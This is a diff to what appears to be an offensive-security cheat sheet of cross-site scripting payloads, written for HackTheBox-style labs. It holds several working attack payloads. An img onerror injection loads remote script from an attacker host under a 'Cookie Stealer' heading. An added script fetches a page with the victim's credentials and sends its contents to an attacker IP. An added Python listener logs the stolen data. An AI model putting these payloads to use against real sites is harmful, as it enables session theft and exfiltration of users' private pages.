@@ -39,7 +39,7 @@ x.send();
 
 ### JavaScript (JS)
 
-### JavaScript Cookie Stealer
+#### JavaScript (JS) Cookie Stealer
 
 ```js
 <img src=1 onerror="this.remove(); var s=document.createElement('script'); s.src='http://<LHOST>/<FILE>.js'; document.body.appendChild(s);">
@@ -59,6 +59,44 @@ x.send();
             console.error('Error fetching token:', err);
         });
 })();
+```
+
+#### JavaScript (JS) Page Downloader
+
+```js
+<script>
+fetch('http://alert.htb/', { credentials: 'include' }) // Fetch the target page
+    .then(response => response.text()) // Convert the response to text
+    .then(data => {
+        // Send the content via a GET request
+        fetch('http://10.10.14.86:8000/exfil?data=' + encodeURIComponent(data));
+    });
+</script>
+```
+
+##### webserver.py
+
+```python
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import logging
+
+class RequestHandler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length)
+        logging.info("Received Data: %s", post_data.decode('utf-8'))
+        self.send_response(200)
+        self.end_headers()
+
+def run(server_class=HTTPServer, handler_class=RequestHandler, port=80):
+    logging.basicConfig(level=logging.INFO)
+    server_address = ('', port)
+    httpd = server_class(server_address, handler_class)
+    logging.info('Starting server on port %d...', port)
+    httpd.serve_forever()
+
+if __name__ == '__main__':
+    run(port=8000)
 ```
 
 #### JavaScript (JS) Fetch Uniform Resource Locator (URL) and Base64 Encoding
